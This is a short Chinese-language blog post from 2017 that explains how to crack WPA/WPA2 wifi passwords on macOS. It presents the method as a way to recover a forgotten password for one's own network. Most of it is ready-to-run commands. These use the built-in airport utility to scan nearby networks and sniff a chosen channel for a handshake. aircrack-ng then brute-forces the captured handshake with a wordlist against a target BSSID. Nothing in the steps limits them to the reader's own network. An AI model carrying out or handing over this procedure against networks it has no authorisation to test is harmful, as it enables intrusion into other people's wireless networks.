---
title: macOS破解WPA/WPA2 wifi密码
date: 2017-04-10 19:59:08
tags: macOS
---

## 你家wifi密码忘记了怎么办？看我的

* 安装aircrack-ng

* 查看周围wifi

```bash
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
```
* 等待连接 获取握手包

```bash
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6
#en0为你的无线网卡 通过ifconfig查看 
#6为需要破解的wifi channel,通过上一条命令获得
```
* control + c , 抓的包保存在/tmp

* 暴力破解

```bash
aircrack-ng -w 字典.txt -b BBSID来自第一条命令 握手包目录
```
* 等吧,接下来你的字典了
